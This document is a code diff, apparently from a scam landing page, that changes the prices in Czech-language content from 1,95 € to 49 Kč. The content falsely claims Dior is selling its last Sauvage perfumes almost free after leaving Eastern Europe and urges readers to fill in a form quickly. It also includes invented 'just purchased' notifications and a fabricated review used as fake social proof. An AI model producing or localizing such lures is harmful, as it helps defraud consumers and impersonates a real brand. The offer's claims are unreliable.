@@ -19,20 +19,20 @@ const orderOriginParam = window.__origin_param;
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    text: "Dior prodává své poslední parfémy Sauvage za pouhých 1,95 € poté, co ukončil své operace ve východní Evropě. Díky nové marketingové strategii může každý Čech dnes získat jeden z 1000 parfémů 🎁.<br><br> Abyste mohli získat parfém Sauvage od Dioru, vyplňte prosím formulář a potvrďte, že jste skutečná osoba. <br><br> Pospěšte si, počet nabízených kusů je omezený!",
+    text: "Dior prodává své poslední parfémy Sauvage za pouhých 49 Kč poté, co ukončil své operace ve východní Evropě. Díky nové marketingové strategii může každý Čech dnes získat jeden z 1000 parfémů 🎁.<br><br> Abyste mohli získat parfém Sauvage od Dioru, vyplňte prosím formulář a potvrďte, že jste skutečná osoba. <br><br> Pospěšte si, počet nabízených kusů je omezený!",
   };
 
   const notifications = [
     {
       user: "Beáta L***",
       location: "Praha, Česko",
-      action: "Právě jsem zakoupila Dior Sauvage 100ml za 1,95 €!",
+      action: "Právě jsem zakoupila Dior Sauvage 100ml za 49 Kč!",
       timeago: "před 15 sekundami",
     },
     {
       user: "Tereza B***",
       location: "Brno, Česko",
-      action: "Právě jsem zakoupila Dior Sauvage 100ml za 1,95 €!",
+      action: "Právě jsem zakoupila Dior Sauvage 100ml za 49 Kč!",
       timeago: "před 25 sekundami",
     },
   ];
@@ -75,7 +75,7 @@ const orderOriginParam = window.__origin_param;
       header: "Wow, jsem naprosto nadšený z tohoto produktu!",
       product: "26468784",
       image: "./assets/proof5.jpg",
-      review: "Neuvěřitelné. Drahý a kvalitní parfém za pouhých 1,95 €. Děkuji!",
+      review: "Neuvěřitelné. Drahý a kvalitní parfém za pouhých 49 Kč. Děkuji!",
     },
   ];
 
